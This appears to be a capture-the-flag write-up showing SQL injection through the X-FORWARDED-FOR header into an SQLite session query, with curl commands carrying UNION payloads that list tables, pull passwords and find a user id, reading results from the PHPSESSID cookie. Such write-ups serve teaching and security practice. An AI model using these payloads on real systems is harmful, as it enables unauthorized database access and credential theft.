<p>At the beginning of the HTML page you can find a sql query with your IP address in it.</p>

<p><code>
SELECT * FROM nxf8_sessions where ip_address = 'xxx.xxx.xxx.xxx'
</code></p>

<p>Using the <code>X-FORWARDED-FOR</code> HTTP header that parameter can be manipulated, furthermore it is vulnerable to SQL injection.</p>

<p>```
$ curl -X GET --header "X-FORWARDED-FOR: '" -i http://35.222.174.178/maria/
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 08 Feb 2019 14:20:34 GMT
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=11keda1pk9cr4un12esv95iji3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Transfer-Encoding: chunked</p>

<p>SELECT * FROM nxf8<em>sessions where ip</em>address = '''Error : HY000 1 unrecognized token: "'''"
```</p>

<p>The database seems to be a <em>SQLite</em>.</p>

<p>After some analysis you can discover that the result of the executed query is used to populate the <code>PHPSESSID</code> cookie.</p>

<p>Crafting a <code>UNION</code> SQL operation with <code>null</code> allows you to discover the user table and the number of columns to union.</p>

<p><code>
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, null from nxf8_users where '1'='1" -i http://35.222.174.178/maria/
</code></p>

<p>Furthermore, you can discover which is the position of the column used to return data: it's the last one.</p>

<p><code>
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, password from nxf8_users where '1'='1" -i http://35.222.174.178/maria/
</code></p>

<p>Now you can extract information and see results into <code>PHPSESSID</code> cookie.</p>

<p>You can discover that there are only two tables: <code>nxf8_users</code> and <code>nxf8_sessions</code>.</p>

<p>```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, count(name) from sqlite_master where type='table" -i http://35.222.174.178/maria/</p>

<p>Analyzing the composition of the sessions table you can discover that you need a value for the <code>user_id</code> column which is the foreign key to the user table.</p>

<p>The <code>id</code> of Maria can be easily retrieved from user table: it is <code>5</code>.</p>

<p>```
$ curl -X GET --header "X-FORWARDED-FOR: pwnd' union select null, null, null, id from nxf8_users where name = 'Maria" -i http://35.222.174.178/maria/</p>
